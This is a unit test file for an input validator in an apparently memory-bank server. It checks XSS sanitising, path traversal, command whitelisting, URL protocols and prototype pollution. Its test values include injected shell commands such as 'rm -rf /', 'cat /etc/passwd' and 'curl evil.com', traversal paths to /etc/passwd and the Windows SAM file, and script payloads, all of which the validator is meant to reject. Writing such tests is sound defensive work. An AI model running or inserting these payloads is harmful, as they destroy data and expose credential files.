/**
 * Unit tests for InputValidator
 * Tests security validation and sanitization functionality
 */

import { InputValidator } from '../../../src/shared/security/input-validator';

describe('InputValidator', () => {
  describe('validateMemoryBankContent', () => {
    it('should accept valid markdown content', () => {
      const validContent = `# Test Content
      
This is a valid markdown file with:
- Lists
- **Bold text**
- *Italic text*
- [Links](https://example.com)

\`\`\`javascript
console.log('code blocks');
\`\`\`
`;
      
      const result = InputValidator.validateMemoryBankContent(validContent);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitizedContent).toBeDefined();
    });

    it('should reject content with script tags', () => {
      const maliciousContent = `# Test Content
      
<script>alert('xss')</script>

This content contains a script tag.`;
      
      const result = InputValidator.validateMemoryBankContent(maliciousContent);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Content contains potentially dangerous scripts or code');
    });

    it('should reject content with javascript: URLs', () => {
      const maliciousContent = `# Test Content
      
[Click here](javascript:alert('xss'))`;
      
      const result = InputValidator.validateMemoryBankContent(maliciousContent);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Content contains potentially dangerous scripts or code');
    });

    it('should reject content exceeding maximum length', () => {
      const longContent = 'a'.repeat(2 * 1024 * 1024); // 2MB
      
      const result = InputValidator.validateMemoryBankContent(longContent);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Content exceeds maximum length of 1048576 characters');
    });

    it('should sanitize content while preserving markdown', () => {
      const contentWithDangerousElements = `# Test Content

<script>alert('xss')</script>

This is **bold** and *italic* text.

<div onclick="alert('click')">Click me</div>

[Safe link](https://example.com)
[Dangerous link](javascript:alert('xss'))`;
      
      const result = InputValidator.validateMemoryBankContent(contentWithDangerousElements);
      
      if (result.sanitizedContent) {
        expect(result.sanitizedContent).not.toContain('<script>');
        expect(result.sanitizedContent).not.toContain('onclick=');
        expect(result.sanitizedContent).not.toContain('javascript:');
        expect(result.sanitizedContent).toContain('**bold**');
        expect(result.sanitizedContent).toContain('*italic*');
      }
    });
  });

  describe('validateFilePath', () => {
    const allowedBasePath = '/test/workspace/memory-bank';

    it('should accept valid file paths within allowed directory', () => {
      const validPaths = [
        'projectbrief.md',
        'subfolder/file.txt',
        'data.json'
      ];

      for (const path of validPaths) {
        const result = InputValidator.validateFilePath(path, allowedBasePath);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      }
    });

    it('should reject directory traversal attempts', () => {
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '../../sensitive-file.txt',
        '../outside-directory/file.txt'
      ];

      for (const path of maliciousPaths) {
        const result = InputValidator.validateFilePath(path, allowedBasePath);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('directory traversal') || 
          error.includes('outside allowed directory')
        )).toBe(true);
      }
    });

    it('should reject files with dangerous extensions', () => {
      const dangerousFiles = [
        'malware.exe',
        'script.bat',
        'virus.com',
        'trojan.scr'
      ];

      for (const file of dangerousFiles) {
        const result = InputValidator.validateFilePath(file, allowedBasePath);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain(`File extension '${file.split('.').pop()?.toLowerCase()}' is not allowed`);
      }
    });

    it('should reject files with null bytes', () => {
      const pathWithNullByte = 'file\x00.txt';
      
      const result = InputValidator.validateFilePath(pathWithNullByte, allowedBasePath);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('File path contains null bytes');
    });

    it('should reject excessively long filenames', () => {
      const longFilename = 'a'.repeat(300) + '.txt';
      
      const result = InputValidator.validateFilePath(longFilename, allowedBasePath);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Filename exceeds maximum length of 255 characters');
    });
  });

  describe('validateCommandInput', () => {
    it('should accept valid commands', () => {
      const validCommands = [
        { command: 'memory.get', args: ['projectbrief.md'] },
        { command: 'memory.update', args: ['activeContext.md', 'new content'] },
        { command: 'server.status', args: [] }
      ];

      for (const { command, args } of validCommands) {
        const result = InputValidator.validateCommandInput(command, args);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      }
    });

    it('should reject commands with shell operators', () => {
      const maliciousCommands = [
        'memory.get; rm -rf /',
        'memory.update | cat /etc/passwd',
        'server.start && curl evil.com'
      ];

      for (const command of maliciousCommands) {
        const result = InputValidator.validateCommandInput(command, []);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Command contains dangerous shell operators');
      }
    });

    it('should reject unknown commands', () => {
      const unknownCommand = 'system.delete';
      
      const result = InputValidator.validateCommandInput(unknownCommand, []);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain(`Command '${unknownCommand}' is not allowed`);
    });

    it('should reject arguments with dangerous characters', () => {
      const dangerousArgs = [
        'file.txt; rm -rf /',
        'content | curl evil.com',
        'data && malicious-command'
      ];

      for (const arg of dangerousArgs) {
        const result = InputValidator.validateCommandInput('memory.update', [arg]);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(error => 
          error.includes('dangerous characters')
        )).toBe(true);
      }
    });

    it('should reject excessively long arguments', () => {
      const longArg = 'a'.repeat(1500);
      
      const result = InputValidator.validateCommandInput('memory.update', [longArg]);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Argument 0 exceeds maximum length');
    });
  });

  describe('validateConfiguration', () => {
    it('should accept valid configuration', () => {
      const validConfig = {
        port: 7331,
        security: {
          maxFileSize: 1024 * 1024,
          allowedExtensions: ['.md', '.txt']
        }
      };
      
      const result = InputValidator.validateConfiguration(validConfig);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
    });

    it('should reject invalid port numbers', () => {
      const invalidConfigs = [
        { port: 80 }, // Too low
        { port: 70000 }, // Too high
        { port: 'invalid' }, // Not a number
        { port: 3.14 } // Not an integer
      ];

      for (const config of invalidConfigs) {
        const result = InputValidator.validateConfiguration(config);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Port must be an integer between 1024 and 65535');
      }
    });

    it('should reject invalid security configuration', () => {
      const invalidConfig = {
        security: {
          maxFileSize: -1,
          allowedExtensions: 'not-an-array'
        }
      };
      
      const result = InputValidator.validateConfiguration(invalidConfig);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Security maxFileSize must be a non-negative integer');
      expect(result.errors).toContain('Security allowedExtensions must be an array');
    });
  });

  describe('validateUrl', () => {
    it('should accept valid HTTP and HTTPS URLs', () => {
      const validUrls = [
        'https://example.com',
        'http://localhost:3000',
        'https://api.github.com/repos/user/repo'
      ];

      for (const url of validUrls) {
        const result = InputValidator.validateUrl(url);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
      }
    });

    it('should reject URLs with dangerous protocols', () => {
      const dangerousUrls = [
        'javascript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'file:///etc/passwd',
        'ftp://malicious.com'
      ];

      for (const url of dangerousUrls) {
        const result = InputValidator.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Only HTTP and HTTPS URLs are allowed');
      }
    });

    it('should reject malformed URLs', () => {
      const malformedUrls = [
        'not-a-url',
        'http://',
        'https://[invalid-host]',
        ''
      ];

      for (const url of malformedUrls) {
        const result = InputValidator.validateUrl(url);
        expect(result.isValid).toBe(false);
        expect(result.errors).toContain('Invalid URL format');
      }
    });
  });

  describe('validateJson', () => {
    it('should accept valid JSON', () => {
      const validJson = JSON.stringify({
        name: 'test',
        value: 123,
        array: [1, 2, 3],
        nested: { key: 'value' }
      });
      
      const result = InputValidator.validateJson(validJson);
      
      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.sanitizedContent).toBeDefined();
    });

    it('should reject invalid JSON', () => {
      const invalidJson = '{ "name": "test", "value": }';
      
      const result = InputValidator.validateJson(invalidJson);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toContain('Invalid JSON format');
    });

    it('should reject JSON with dangerous properties', () => {
      const dangerousJson = JSON.stringify({
        __proto__: { malicious: true },
        constructor: { dangerous: true },
        prototype: { evil: true }
      });
      
      const result = InputValidator.validateJson(dangerousJson);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.some(error => 
        error.includes('Dangerous property')
      )).toBe(true);
    });
  });
});
